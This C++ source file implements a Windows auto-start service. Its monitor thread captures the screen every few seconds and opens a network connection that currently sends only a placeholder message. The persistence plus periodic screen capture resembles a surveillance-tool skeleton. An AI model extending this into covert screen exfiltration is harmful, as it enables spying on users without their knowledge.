#include "CServiceController.h"
#include "../video/CVideoController.h"
#include "../network/CNetworkController.h"

void WINAPI Main(DWORD dwArgc, LPTSTR *lpszArgv)
{
	DWORD   status = 0; 
    DWORD   specificError = 0xfffffff; 
	CServiceController::Instance()->m_ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    CServiceController::Instance()->m_ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    CServiceController::Instance()->m_ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE; 
    CServiceController::Instance()->m_ServiceStatus.dwWin32ExitCode      = 0; 
    CServiceController::Instance()->m_ServiceStatus.dwServiceSpecificExitCode = 0; 
    CServiceController::Instance()->m_ServiceStatus.dwCheckPoint         = 0; 
    CServiceController::Instance()->m_ServiceStatus.dwWaitHint           = 0; 
 
	CServiceController::Instance()->m_hServiceStatusHandle = RegisterServiceCtrlHandler(CGlobal::g_pServiceName, Handler); 
    if (CServiceController::Instance()->m_hServiceStatusHandle==0) 
    {
		long nError = GetLastError();
		char pTemp[121];
		sprintf_s(pTemp, "RegisterServiceCtrlHandler failed, error code = %d\n", nError);
		CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
        return; 
    } 
 
    CServiceController::Instance()->m_ServiceStatus.dwCurrentState       = SERVICE_RUNNING; 
    CServiceController::Instance()->m_ServiceStatus.dwCheckPoint         = 0; 
    CServiceController::Instance()->m_ServiceStatus.dwWaitHint           = 0;  
    if(!SetServiceStatus(CServiceController::Instance()->m_hServiceStatusHandle, &CServiceController::Instance()->m_ServiceStatus)) 
    { 
		long nError = GetLastError();
		char pTemp[121];
		sprintf_s(pTemp, "SetServiceStatus failed, error code = %d\n", nError);
		CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
    } 
}

void WINAPI Handler(DWORD fdwControl)
{
	switch(fdwControl) 
	{
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			//ProcessStarted = FALSE;
			CServiceController::Instance()->m_ServiceStatus.dwWin32ExitCode = 0; 
			CServiceController::Instance()->m_ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
			CServiceController::Instance()->m_ServiceStatus.dwCheckPoint    = 0; 
			CServiceController::Instance()->m_ServiceStatus.dwWaitHint      = 0;
			break; 
		case SERVICE_CONTROL_PAUSE:
			CServiceController::Instance()->m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
			break;
		case SERVICE_CONTROL_CONTINUE:
			CServiceController::Instance()->m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
		default:
			if(fdwControl>=128 && fdwControl<256)
			{
			}
			else
			{
				char pTemp[121];
				sprintf_s(pTemp,  "Unrecognized opcode %d\n", fdwControl);
				CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
			}
	};
    if (!SetServiceStatus(CServiceController::Instance()->m_hServiceStatusHandle,  &CServiceController::Instance()->m_ServiceStatus)) 
	{ 
		long nError = GetLastError();
		char pTemp[121];
		sprintf_s(pTemp, "SetServiceStatus failed, error code = %d\n", nError);
		CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
    } 
}

#define SCREEN_DELAY 3000

void MonitorThread(void*)
{
	while(true)
	{      
		static DWORD dwLastTime = 0;     
		DWORD dwCurrentTime = GetTickCount();

		if( dwCurrentTime - dwLastTime > SCREEN_DELAY )
		{
			dwLastTime = dwCurrentTime;
			CVideoController::Instance()->TakeScreen();
			if(CNetworkController::Instance()->Connect())
			{
				std::string message = "Hello World";
				CNetworkController::Instance()->Send(message.c_str(), message.length());
				CNetworkController::Instance()->Disconnect();
			}
		}
	}
}

CServiceController* CServiceController::m_controller = NULL;

CServiceController::CServiceController()
{
	m_lpServiceStartTable = new SERVICE_TABLE_ENTRY[2];
	m_lpServiceStartTable[0].lpServiceName = CGlobal::g_pServiceName;
	m_lpServiceStartTable[0].lpServiceProc = Main;

	m_lpServiceStartTable[1].lpServiceName = NULL;
	m_lpServiceStartTable[1].lpServiceProc = NULL;
}

CServiceController::~CServiceController()
{

}

CServiceController* CServiceController::Instance()
{
	if( m_controller == NULL )
	{
		m_controller = new CServiceController();
	}

	return m_controller;
}


void CServiceController::StartTask()
{
	DWORD dwSize = GetModuleFileName(NULL, CGlobal::g_pModuleFile, BUFFER_SIZE);
	CGlobal::g_pModuleFile[dwSize] = 0;
	if(dwSize > 4 && CGlobal::g_pModuleFile[dwSize - 4] == '.')
	{
		sprintf(CGlobal::g_pExeFile,"%s",CGlobal::g_pModuleFile);
		CGlobal::g_pModuleFile[dwSize - 4] = 0;
		sprintf(CGlobal::g_pLogFile,"%s.log",CGlobal::g_pModuleFile);
		sprintf(CGlobal::g_pScreenFile,"%s.bmp",CGlobal::g_pModuleFile);
	}
	strcpy_s(CGlobal::g_pServiceName,sizeof(SERVICE_NAME), SERVICE_NAME);

	if(_stricmp("-i",CGlobal::g_lpCmdLineData) == 0 || _stricmp("-I",CGlobal::g_lpCmdLineData) == 0)
	{
		Install(CGlobal::g_pExeFile, CGlobal::g_pServiceName);
	}
	else if(_stricmp("-k",CGlobal::g_lpCmdLineData) == 0 || _stricmp("-K",CGlobal::g_lpCmdLineData) == 0)
	{
		KillService(CGlobal::g_pServiceName);
	}
	else if(_stricmp("-u",CGlobal::g_lpCmdLineData) == 0 || _stricmp("-U",CGlobal::g_lpCmdLineData) == 0)
	{
		Uninstall(CGlobal::g_pServiceName);
	}
	else if(_stricmp("-s",CGlobal::g_lpCmdLineData) == 0 || _stricmp("-S",CGlobal::g_lpCmdLineData) == 0)
	{
		RunService(CGlobal::g_pServiceName);
	}
	else
	{
		ExecuteProcess();
	}
}


void CServiceController::Install(char* _pPath, char* _pName)
{  
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE); 
	if (schSCManager==0) 
	{
		long nError = GetLastError();
		char pTemp[121];
		sprintf_s(pTemp, "OpenSCManager failed, error code = %d\n", nError);
		CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
	}
	else
	{
		SC_HANDLE schService = CreateService
		( 
			schSCManager,											/* SCManager database      */ 
			_pName,													/* name of service         */ 
			_pName,													/* service name to display */ 
			SERVICE_ALL_ACCESS,										/* desired access          */ 
			SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS , /* service type            */ 
			SERVICE_AUTO_START,										/* start type              */ 
			SERVICE_ERROR_NORMAL,									/* error control type      */ 
			_pPath,													/* service's binary        */ 
			NULL,													/* no load ordering group  */ 
			NULL,													/* no tag identifier       */ 
			NULL,													/* no dependencies         */ 
			NULL,													/* LocalSystem account     */ 
			NULL
		);															/* no password             */ 
		if (schService==0) 
		{
			long nError =  GetLastError();
			char pTemp[121];
			sprintf_s(pTemp, "Failed to create service %s, error code = %d\n", _pName, nError);
			CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
		}
		else
		{
			char pTemp[121];
			sprintf_s(pTemp, "Service %s installed\n", _pName);
			CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager);
	}	
}

void CServiceController::Uninstall(char* _pName)
{
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager==0) 
	{
		long nError = GetLastError();
		char pTemp[121];
		sprintf_s(pTemp, "OpenSCManager failed, error code = %d\n", nError);
		CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
	}
	else
	{
		SC_HANDLE schService = OpenService( schSCManager, _pName, SERVICE_ALL_ACCESS);
		if (schService==0) 
		{
			long nError = GetLastError();
			char pTemp[121];
			sprintf_s(pTemp, "OpenService failed, error code = %d\n", nError);
			CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
		}
		else
		{
			if(!DeleteService(schService)) 
			{
				char pTemp[121];
				sprintf_s(pTemp, "Failed to delete service %s\n", _pName);
				CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
			}
			else 
			{
				char pTemp[121];
				sprintf_s(pTemp, "Service %s removed\n",_pName);
				CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
			}
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager);	
	}
	DeleteFile(CGlobal::g_pLogFile);
}


bool CServiceController::RunService(char* _pName) 
{ 
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager==0) 
	{
		long nError = GetLastError();
		char pTemp[121];
		sprintf_s(pTemp, "OpenSCManager failed, error code = %d\n", nError);
		CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
	}
	else
	{
		SC_HANDLE schService = OpenService( schSCManager, _pName, SERVICE_ALL_ACCESS);
		if (schService==0) 
		{
			long nError = GetLastError();
			char pTemp[121];
			sprintf_s(pTemp, "OpenService failed, error code = %d\n", nError);
			CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
		}
		else
		{
			if(StartService(schService, 0, (const char**)NULL))
			{
				CloseServiceHandle(schService); 
				CloseServiceHandle(schSCManager); 
				return true;
			}
			else
			{
				long nError = GetLastError();
				char pTemp[121];
				sprintf_s(pTemp, "StartService failed, error code = %d\n", nError);
				CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
			}
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager); 
	}
	return false;
}

bool CServiceController::KillService(char* _pName) 
{ 
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager==0) 
	{
		long nError = GetLastError();
		char pTemp[121];
		sprintf_s(pTemp, "OpenSCManager failed, error code = %d\n", nError);
		CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
	}
	else
	{
		SC_HANDLE schService = OpenService( schSCManager, _pName, SERVICE_ALL_ACCESS);
		if (schService==0) 
		{
			long nError = GetLastError();
			char pTemp[121];
			sprintf_s(pTemp, "OpenService failed, error code = %d\n", nError);
			CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
		}
		else
		{
			SERVICE_STATUS status;
			if(ControlService(schService,SERVICE_CONTROL_STOP,&status))
			{
				CloseServiceHandle(schService); 
				CloseServiceHandle(schSCManager); 
				return true;
			}
			else
			{
				long nError = GetLastError();
				char pTemp[121];
				sprintf_s(pTemp, "ControlService failed, error code = %d\n", nError);
				CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
			}
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager); 
	}
	return false;
}

void  CServiceController::ExecuteProcess()
{
	if(_beginthread(MonitorThread, 0, NULL) == -1)
	{
		long nError = GetLastError();
		char pTemp[121];
		sprintf_s(pTemp, "StartService failed, error code = %d\n", nError);
		CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
	}
	if(!StartServiceCtrlDispatcher(m_lpServiceStartTable))
	{
		long nError = GetLastError();
		char pTemp[121];
		sprintf_s(pTemp, "StartServiceCtrlDispatcher failed, error code = %d\n", nError);
		CLogger::Instance()->Write(CGlobal::g_pLogFile, pTemp);
	}
}
